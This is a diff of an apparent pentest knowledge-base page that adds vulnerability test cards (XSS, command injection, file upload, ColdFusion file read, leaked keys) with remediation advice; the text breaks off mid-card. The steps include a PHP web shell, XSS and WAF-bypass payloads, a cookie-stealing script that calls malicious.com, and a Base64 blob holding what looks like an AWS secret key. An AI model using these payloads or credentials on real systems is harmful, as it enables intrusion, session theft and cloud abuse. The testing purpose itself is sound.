@@ -592,11 +592,11 @@
     <section class="top-row">
       <div class="metric">
         <h2>Total Test Cases</h2>
-        <div class="metric-value">111</div>
+        <div class="metric-value">143</div>
       </div>
       <div class="metric">
         <h2>Last Updated</h2>
-        <div class="metric-value">2026-01-12</div>
+        <div class="metric-value">2026-01-14</div>
       </div>
     </section>
 
@@ -604,7 +604,7 @@
       <h2>Category Breakdown</h2>
       
     <div class="analytics-row">
-      <div class="analytics-label">Network <span>47</span></div>
+      <div class="analytics-label">Web App <span>65</span></div>
       <div class="analytics-bar">
         <div class="analytics-bar-fill" style="width:100%"></div>
       </div>
@@ -612,17 +612,17 @@
     
 
     <div class="analytics-row">
-      <div class="analytics-label">Web App <span>41</span></div>
+      <div class="analytics-label">Network <span>49</span></div>
       <div class="analytics-bar">
-        <div class="analytics-bar-fill" style="width:87%"></div>
+        <div class="analytics-bar-fill" style="width:75%"></div>
       </div>
     </div>
     
 
     <div class="analytics-row">
-      <div class="analytics-label">API <span>11</span></div>
+      <div class="analytics-label">API <span>16</span></div>
       <div class="analytics-bar">
-        <div class="analytics-bar-fill" style="width:23%"></div>
+        <div class="analytics-bar-fill" style="width:25%"></div>
       </div>
     </div>
     
@@ -630,7 +630,7 @@
     <div class="analytics-row">
       <div class="analytics-label">Source Code <span>10</span></div>
       <div class="analytics-bar">
-        <div class="analytics-bar-fill" style="width:21%"></div>
+        <div class="analytics-bar-fill" style="width:15%"></div>
       </div>
     </div>
     
@@ -650,6 +650,14 @@
       </div>
     </div>
     
+
+    <div class="analytics-row">
+      <div class="analytics-label">Library <span>1</span></div>
+      <div class="analytics-bar">
+        <div class="analytics-bar-fill" style="width:2%"></div>
+      </div>
+    </div>
+    
     </section>
 
     <section class="filters">
@@ -660,13 +668,14 @@
       <div>
         <label for="categoryFilter">Category</label>
         <select id="categoryFilter">
-          <option value="all">All Categories (111)</option>
-          <option value="Network">Network (47)</option>
-<option value="Web App">Web App (41)</option>
-<option value="API">API (11)</option>
+          <option value="all">All Categories (143)</option>
+          <option value="Web App">Web App (65)</option>
+<option value="Network">Network (49)</option>
+<option value="API">API (16)</option>
 <option value="Source Code">Source Code (10)</option>
 <option value="Blockchain">Blockchain (1)</option>
 <option value="Desktop App">Desktop App (1)</option>
+<option value="Library">Library (1)</option>
         </select>
       </div>
     </section>
@@ -675,6 +684,983 @@
 
     <section class="cards" id="cardContainer">
       
+    <article class="card" data-category="Library">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Library</span>
+          <span class="card-title-text">Use-After-Free in Header Handling</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-01-14</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability arises from improper management of header data within a library’s API. When processing multiple requests using the same handle, the library frees and rebuilds its internal header list. If the application retains references to previously returned header objects, passing them back to a specific API function leads to a use-after-free condition, potentially resulting in application crashes or memory corruption.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Initialize a connection handle using the library’s initialization function (e.g., <code>curl<em>easy</em>init()</code>).</li>
+<li>Perform an initial request to a server.</li>
+<li>Retrieve a header object from the response using the API function that provides access to headers (e.g., <code>curl<em>easy</em>nextheader()</code>).  Store a reference to this header object.</li>
+<li>Perform a subsequent request using the same connection handle. This causes the library to free and rebuild its internal header list.</li>
+<li>Pass the stored, stale header object reference to the same API function used to retrieve headers (e.g., <code>curl<em>easy</em>nextheader()</code>).  The API function will attempt to dereference a freed memory location.</li>
+<li>Observe any resulting crashes or errors.</li>
+<li>Example payload/input:  Assume a header object <code>h</code> obtained after the first request.  The vulnerable call would be <code>curl<em>easy</em>nextheader(handle, type, -1, h)</code>.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Exploitation of this vulnerability can lead to several negative consequences including process crashes (denial-of-service), heap memory corruption, and, potentially, arbitrary code execution depending on the state of the heap and memory allocator.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Ensure that header objects returned by the API are invalidated when a new request is initiated. Implement a mechanism to track the lifetime of header objects and prevent their reuse across different requests.  Consider providing an API function to explicitly release or invalidate header objects.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Network">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Network</span>
+          <span class="card-title-text">OS Command Injection via GlobalProtect</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-01-14</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A command injection vulnerability exists in a network device&#x27;s GlobalProtect feature, allowing an unauthenticated attacker to execute arbitrary code with root privileges. This occurs due to insufficient input validation within a specific configuration, leading to the potential for unauthorized system access and modification. This vulnerability does not affect all devices within the vendor&#x27;s product line.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Send an HTTP request to the targeted device&#x27;s GlobalProtect endpoint, including a malicious command in a specific parameter.</li>
+<li>The crafted command should attempt to create a file on the server with root privileges. For example: <code>echo &quot;malicious_payload&quot; &gt; /tmp/testfile</code>.</li>
+<li>Verify the creation of the file on the server. An indication of success might be a 403 Forbidden response instead of a 404 Not Found.</li>
+<li>Attempt to access the created file.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Successful exploitation allows an attacker to execute arbitrary commands on the network device with root privileges, potentially leading to unauthorized data access, system compromise, or complete control of the device.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust input validation and sanitization on all user-supplied data used in system commands. Utilize parameterized commands or a similar mechanism to prevent the execution of arbitrary code. Regularly review and update security configurations to mitigate potential vulnerabilities.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">Unrestricted File Upload via HTML Editor Provider</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-01-14</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability allows an attacker to upload arbitrary files to a server without authentication, potentially leading to website defacement and the injection of malicious payloads. The core issue stems from a lack of proper file type validation or access controls within the HTML editor provider, enabling unauthorized file modification.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Send a raw POST request to the file upload endpoint: <code>&lt;TARGET_URL&gt;/Providers/HtmlEditorProviders/DNNConnect.CKE/Browser/FileUploader.ashx</code></li>
+<li>The request body should contain the file to be uploaded.</li>
+<li>No authentication is required to perform this action.</li>
+<li>The uploaded file should contain a malicious payload, such as a PHP shell for remote code execution or an HTML file containing cross-site scripting (XSS) code. Example payload: <code>&lt;?php echo shell<em>exec($</em>REQUEST[&#x27;cmd&#x27;]); ?&gt;</code></li>
+<li>Verify that the uploaded file is writable and accessible via the web server.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An attacker can upload malicious files, potentially leading to website defacement, cross-site scripting (XSS), remote code execution, and compromise of sensitive data.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement strict file type validation and size limits on uploaded files. Implement robust access control checks to ensure that only authorized users can upload files. Regularly update the HTML editor provider to the latest version. Sanitize and encode any user-supplied data before rendering it on the web page.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="API">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">API</span>
+          <span class="card-title-text">PII Data Leak via API Response</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-01-14</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> The API endpoint was found to be leaking Personally Identifiable Information (PII) in its response body without proper access controls. This vulnerability allows unauthorized access to sensitive user data, potentially leading to identity theft, fraud, or other malicious activities. The leak occurs because the API does not properly validate user permissions before returning the data.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Send a GET request to the API endpoint: <code>&lt;TARGET<em>API</em>ENDPOINT&gt;</code>.</li>
+<li>Observe the response body. It should contain a JSON or XML structure.</li>
+<li>Examine the response body for fields containing PII, such as full names, addresses, phone numbers, email addresses, or social security numbers.</li>
+<li>Verify if the API returns the same PII data regardless of the authenticated user&#x27;s role or permissions.  A successful exploit does not require specific credentials or elevated privileges.</li>
+<li>Example (illustrative): If the response is JSON, it might look like: <code>{&quot;user_id&quot;: &quot;123&quot;, &quot;name&quot;: &quot;John Doe&quot;, &quot;address&quot;: &quot;123 Main St&quot;, &quot;phone&quot;: &quot;555-123-4567&quot;}</code>.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Exposure of sensitive PII data can lead to identity theft, financial fraud, reputational damage, and legal liabilities. Unauthorized access to this data could enable attackers to perform further malicious activities against affected individuals.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust access control mechanisms to ensure users can only access data they are authorized to view. Validate user roles and permissions before returning any data, especially PII. Consider data masking or redaction techniques to minimize the impact of a potential breach. Regularly review and update API security policies and implement logging and monitoring to detect unauthorized access attempts.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="API">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">API</span>
+          <span class="card-title-text">Exposed Sensitive Credentials in Publicly Accessible ZIP Archive</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-01-14</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A publicly accessible ZIP archive contained sensitive information such as SMTP credentials, database connection details, and cloud provider (e.g., AWS) secret keys. This exposure allows an attacker to gain unauthorized access to various systems and data, potentially leading to data theft, system compromise, and privilege escalation.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Access the ZIP archive at the specified URL: <code>&lt;TARGET<em>URL&gt;/data/&lt;ZIP</em>FILE_NAME&gt;.zip</code>.</li>
+<li>Download the ZIP archive using a standard tool (e.g., web browser, <code>curl</code>).</li>
+<li>Extract the contents of the downloaded ZIP archive using a standard extraction tool (e.g., unzip).</li>
+<li>Examine the extracted files, searching for sensitive information such as:</li>
+</ol>
+<ul>
+<li>SMTP credentials (username, password, host, port)</li>
+<li>Database connection details (username, password, host, database name)</li>
+<li>Cloud provider secret keys (e.g., AWS access key, secret key, session token). Example: <code>&lt;CLOUD<em>PROVIDER</em>SECRET_KEY&gt;</code></li>
+</ul>
+<ol>
+<li>If sensitive information is found, verify that unauthorized access to those systems and data is possible.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> The exposure of sensitive credentials could lead to unauthorized access to email services, databases, and cloud resources, potentially causing data theft, system compromise, and further attacks.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement the following countermeasures to prevent this vulnerability:</p>
+<ul>
+<li>Restrict access to ZIP archives containing sensitive data, ensuring they are not publicly accessible.</li>
+<li>Store sensitive credentials securely, avoiding storage in plain text files within archives.</li>
+<li>Rotate exposed credentials and implement a key management system to manage access and rotation.</li>
+<li>Encrypt sensitive data at rest and in transit.</li>
+<li>Implement robust access controls and monitor access attempts to sensitive resources.</li>
+</ul>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="API">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">API</span>
+          <span class="card-title-text">Secret Access Key Disclosure in Error Document</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-01-14</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> An error document endpoint exposed a Base64 encoded secret access key, granting unauthorized access to an AWS Firehose service. This allows an attacker to potentially manipulate data streams and incur significant costs or impact downstream systems.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Navigate to a specified error document endpoint on a target system (e.g., <code>/error_docs/uat.js</code>).</li>
+<li>Retrieve the Base64 encoded string from the endpoint&#x27;s response.</li>
+<li>Decode the Base64 string to reveal a secret access key and related metadata.  Example Base64 encoded string: <code>ewogICAgInN0cmVhbSI6ICJwbGVzay0xOC4wLXV4IiwKICAgICJub1Nlc3Npb25TdHJlYW0iOiAicGxlc2stMTguMC11eC1ub19zZXNzaW9uIiwKICAgICJyZWdpb24iOiAidXMtd2VzdC0yIiwKICAgICJhY2Nlc3NLZXlJZCI6ICJBS0lBUjRZRVlSSkxYUFpQWUJGTCIsCiAgICAic2VjcmV0QWNjZXNzS2V5IjogIlFzNHJPZXN0c1pOWjlvYzVrY2NXWlVrUUNXU2JrWnRQSEJibHRraTMiLAogICAgImVuZHBvaW50IjogImZpcmVob3NlLnVzLXdlc3QtMi5hbWF6b25hd3MuY29tIiwKICAgICJodHRwT3B0aW9ucyI6IHsKICAgICAgICAiY29ubmVjdFRpbWVvdXQiOiA1MDAwLAogICAgICAgICJ0aW1lb3V0IjogNTAwMAogICAgfQp9Cg==</code></li>
+<li>Utilize the decoded secret access key to perform actions that the key permits, such as adding records to a data stream.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Unauthorized access to the AWS Firehose service, potentially leading to increased costs due to data processing charges, overloading downstream systems (e.g., S3, Redshift), or data manipulation.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Ensure sensitive credentials, such as AWS access keys, are not exposed in error documents or publicly accessible files. Implement robust access control mechanisms and regularly review and rotate credentials. Avoid embedding secrets directly in application code or files.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">Unauthenticated Arbitrary File Read via ColdFusion</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-01-14</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability allows an unauthenticated attacker to read arbitrary files on the server by manipulating serialized data within a ColdFusion application. This can lead to unauthorized access to sensitive system files, configuration data, or other critical information. The core issue is insufficient validation of user-supplied data during deserialization.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Configure a proxy tool (like Burpsuite) and set the target to the vulnerable application&#x27;s URL.</li>
+<li>Send a POST request to a specific endpoint (e.g., <code>/cf<em>scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=wizardHash&amp;</em>cfclient=true&amp;returnFormat=wddx&amp;inPassword=foo</code>).</li>
+<li>Craft the POST request body as follows:</li>
+</ol>
+<pre><code>_variables=%7b%22_metadata%22%3a%7b%22classname%22%3a%22i/../lib/password.properties%22%7d%2c%22_variables%22%3a%5b%5d%7d</code></pre>
+<ol>
+<li>Observe the server&#x27;s response.  The response should contain a password hash.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An attacker can potentially read sensitive files such as configuration files, database connection strings, or other data containing confidential information. This can lead to data breaches and compromise system security.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement strict input validation and sanitization on all user-supplied data before deserialization. Utilize secure deserialization libraries or frameworks that incorporate robust security checks and prevent arbitrary code execution. Ensure the ColdFusion application is up-to-date with the latest security patches and updates provided by Adobe.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">Stored XSS via EVENT_DESCRIPTION Parameter</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-01-14</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A stored Cross-Site Scripting (XSS) vulnerability exists within an application&#x27;s functionality that allows attackers to inject malicious scripts into a database or server-side storage. These injected scripts are then executed in the browsers of other users who access the affected content, leading to potential session hijacking, data theft, or defacement. The vulnerability is triggered by injecting a malicious payload into a field that is stored and later displayed without proper sanitization.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Access the application&#x27;s submission form via POST request at &lt;TARGET_URL&gt;.</li>
+<li>Populate the <code>EVENT_DESCRIPTION</code> parameter with a malicious XSS payload.  Example payload: <code>&lt;/textarea&gt;&lt;input&gt;&lt;/zzz&gt;&lt;zzz&gt;&lt;img/src/onerror=print</code><code>&gt;&lt;/zzz&gt;</code></li>
+<li>Submit the form.</li>
+<li>Observe if the injected script executes when the affected page or content is viewed by another user or even the tester, confirming the XSS vulnerability.</li>
+<li>The tester may be prompted to agree to consent to proceed.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Exploitation of this vulnerability can lead to severe consequences, including session hijacking, data theft, and potentially allowing an attacker to control user accounts or deface the website.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust input validation and output encoding/escaping mechanisms for all user-supplied data that is stored and subsequently displayed. Use parameterized queries or prepared statements to prevent injection attacks. Consider using a Content Security Policy (CSP) to restrict the resources that the browser is allowed to load.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">Reflected XSS via ResolveUrl</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-01-14</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability allows an attacker to inject arbitrary JavaScript code into a web application due to improper handling of user-controlled input when resolving URLs. The <code>ResolveUrl</code> method is used without adequate sanitization, leading to reflected cross-site scripting (XSS) when malicious URLs are processed. This can lead to severe security implications.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Navigate to a page that utilizes the <code>ResolveUrl</code> method to render a URL based on user input. This could be a page displaying file paths or dynamically generated links.</li>
+<li>Construct a malicious URL containing an XSS payload within the parameter used by <code>ResolveUrl</code>. The payload should be URL encoded to bypass potential filters.</li>
+<li>Submit the crafted URL to the application.</li>
+<li>Observe if the injected JavaScript code executes within the user’s browser context.</li>
+</ol>
+
+<p>Example Payload: <code>(Z(&#x27;ontestingb3t2h%20onload%3dprint%60%60%20fnwve%3d%27zzzzz</code>8504695818<code>%27&#x27;))</code></p>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Exploitation of this vulnerability can lead to session hijacking, allowing attackers to steal cookies and impersonate legitimate users. Furthermore, attackers might be able to deface the website or redirect users to malicious sites.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust input validation and output encoding for any user-controlled data used within the <code>ResolveUrl</code> method. Consider using a context-aware encoding library to ensure the correct encoding based on the output context. Properly sanitizing URL parameters is crucial.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">Stored XSS via ResolveUrl</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-01-14</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A Cross-Site Scripting (XSS) vulnerability exists due to improper handling of user-controlled input within a URL resolution function.  The function fails to sanitize input passed to it, allowing an attacker to inject arbitrary JavaScript payloads that execute in the user&#x27;s browser. This can lead to severe consequences for affected users and the application.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Construct a malicious URL containing a JavaScript payload within the URL parameters. The payload should be designed to exploit the vulnerability in the URL resolution function.</li>
+<li>Access the vulnerable endpoint using the constructed URL.</li>
+<li>Observe the execution of the injected JavaScript payload within the browser&#x27;s developer console.</li>
+<li>Example Payload: <code>(Z(&#x27;ontestingb3t2h onload=print</code><code> fnwve=&#x27;zzzzz</code>8504695818<code>&#x27;))</code></li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Exploitation of this vulnerability can lead to session hijacking (cookie theft) and impersonation of legitimate users. Attackers can also potentially deface the web page or redirect users to malicious websites.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement context-dependent encoding and validation on all user-supplied data used in URL construction. Utilize secure coding practices to prevent injection of malicious scripts within URL parameters.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">Reflected XSS via Event Handler Bypass</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-01-14</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A reflected cross-site scripting (XSS) vulnerability exists in a web application&#x27;s report viewer endpoint. The vulnerability is triggered by exploiting a lack of filtering for a specific event handler attribute in a particular browser, allowing malicious JavaScript to be executed within the user&#x27;s browser context.  Dynamic payload construction further aids in bypassing web application firewalls (WAFs).</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Launch a browser known to support the vulnerable event handler (e.g., Safari on macOS).  Use a private/incognito window for testing.</li>
+<li>Navigate to the URL containing the crafted payload: <code>&lt;TARGET_URL&gt;%22{var{3:s,2:h,5:a,0:v,4:n,1:e}=%27earltv%27}[self][0][v%2ba%2be%2bs](e%2bs%2bv%2bh%2bn)(origin)</code></li>
+<li>Observe the execution of the injected JavaScript (e.g., an alert box or a command logged to the browser&#x27;s console) to confirm the vulnerability.</li>
+<li>Test with a dynamically constructed eval function such as <code>{var{3:s,2:h,5:a,0:v,4:n,1:e}=&#x27;earltv&#x27;}[self][0][v+a+e+s](e+s+v+h+n)(origin)</code> to bypass signature-based WAF detection.</li>
+<li>Verify that the WAF does not block or sanitize the injected payload.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Exploitation of this vulnerability could allow an attacker to steal session tokens or cookies, perform targeted phishing by injecting malicious scripts, hijack authenticated user workflows, or undermine trust in the application.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong></p>
+<ol>
+<li>Input Validation &amp; Encoding: Implement robust input validation and HTML encoding of user-controlled input before reflection.</li>
+<li>Attribute Whitelisting:  Restrict allowed HTML attributes to a safe list and disallow browser-specific event handlers.</li>
+<li>Content Security Policy (CSP): Enforce a strict CSP to restrict inline scripts and unauthorized usage of the <code>eval</code> function.</li>
+<li>WAF Tuning: Configure WAF rules to detect and block dynamic string concatenation used to construct <code>eval</code> calls. Implement checks for browser-specific event attributes.</li>
+<li>Browser-Aware Testing: Regularly test WAF effectiveness against browser-specific features and obfuscated payloads.</li>
+</ol>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">Reflected XSS via description_extra Parameter</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-01-14</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A reflected Cross-Site Scripting (XSS) vulnerability exists within a parameter, allowing an attacker to inject malicious scripts that could be executed in the context of the user&#x27;s browser. This can lead to session hijacking, cookie theft, and other malicious actions depending on the injected payload.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Prepare an HTML form containing a hidden input field named <code>description_extra</code>.  The form should be submitted to a target URL using the POST method.</li>
+<li>Populate the <code>description_extra</code> field with a malicious payload. For example: <code>&lt;img/src/onerror=alert(1)&gt;</code></li>
+<li>Submit the form.</li>
+<li>Observe whether the injected script executes within the user&#x27;s browser.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Exploitation of this vulnerability can lead to session hijacking, cookie theft, defacement of the web page, and potential redirection to malicious sites. Attackers can impersonate legitimate users and compromise their accounts.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust input validation and output encoding on user-supplied data. Utilize context-dependent escaping to prevent malicious scripts from being executed. Use a Content Security Policy (CSP) to restrict the sources from which scripts can be executed.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">Stored XSS via autoPlay Parameter</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-01-14</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A cross-site scripting (XSS) vulnerability exists within a web application allowing an attacker to inject malicious scripts through a GET parameter. This can lead to a variety of attacks including session hijacking, account compromise, and defacement of the affected page. The vulnerability stems from inadequate input validation or output encoding of user-supplied data.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Construct a URL containing the <code>autoPlay</code> parameter with a malicious JavaScript payload.</li>
+<li>Access the URL in a web browser.</li>
+<li>Observe if the injected script executes, typically indicated by an alert box or other visible change to the page.</li>
+</ol>
+
+<p><code>https://&lt;TARGET_URL&gt;?autoPlay=&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An attacker could leverage this XSS vulnerability to steal sensitive user data such as cookies, hijack user sessions, or inject malicious content into the page, potentially leading to unauthorized account access and compromise.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust input validation and output encoding practices for all user-supplied data, especially when rendered within the application&#x27;s HTML. Utilize context-aware escaping techniques to prevent the execution of injected scripts. Consider using a Content Security Policy (CSP) to restrict the sources from which scripts can be executed.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">Reflected XSS via RAISED_FUNDS_DESC Parameter</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-01-14</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A reflected Cross-Site Scripting (XSS) vulnerability exists in a web application, allowing an attacker to inject malicious scripts through the <code>RAISED<em>FUNDS</em>DESC</code> parameter. This can lead to unauthorized actions, such as cookie theft or session hijacking, impacting user security and application integrity. The vulnerability is triggered via a POST request.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Prepare a POST request to &lt;TARGET<em>URL&gt; that includes the <code>RAISED</em>FUNDS_DESC</code> parameter.</li>
+<li>Inject the following payload into the <code>RAISED<em>FUNDS</em>DESC</code> parameter: <code>&lt;input&gt;1234567&lt;/textarea&gt;&#x27;&quot;&gt;&lt;A HRef=\&quot; AutoFocus OnFocus=;1^(print)</code><code>^1&gt;&quot;</code></li>
+<li>Submit the POST request.</li>
+<li>If the application does not properly sanitize user inputs, the injected script will be executed in the user&#x27;s browser, potentially displaying an alert or performing other malicious actions.</li>
+<li>Verify the presence of the injected script execution within the browser.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Exploitation of this vulnerability can lead to unauthorized actions on behalf of the user, including session hijacking, account takeover, and potential defacement of the application.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust input validation and output encoding techniques to prevent the execution of malicious scripts. Specifically, all user-supplied data, including the <code>RAISED<em>FUNDS</em>DESC</code> parameter, should be properly sanitized and encoded before being rendered in the browser. Context-dependent encoding is crucial for effective XSS prevention.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">Stored XSS via URL Parameter</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-01-14</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A cross-site scripting (XSS) vulnerability exists due to insufficient input validation when handling user-supplied data in a URL parameter. An attacker can inject malicious scripts that are then executed in the context of a user&#x27;s browser, potentially leading to session hijacking or other malicious actions.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Navigate to a URL with a vulnerable parameter, such as &lt;TARGET_URL&gt;?&lt;PARAMETER&gt;=.</li>
+<li>Inject a malicious script payload into the <code>&lt;PARAMETER&gt;</code> URL parameter.  For example, <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>.</li>
+<li>Observe if the injected script executes in the user’s browser, indicating successful XSS.</li>
+<li>Alternatively, attempt to steal cookies or redirect the user to a malicious site. Example: &lt;TARGET_URL&gt;?&lt;PARAMETER&gt;=&lt;script&gt;document.location=&#x27;http://malicious.com/cookieStealer.php?cookie=&#x27;+document.cookie&lt;/script&gt;</li>
+</ol>
+
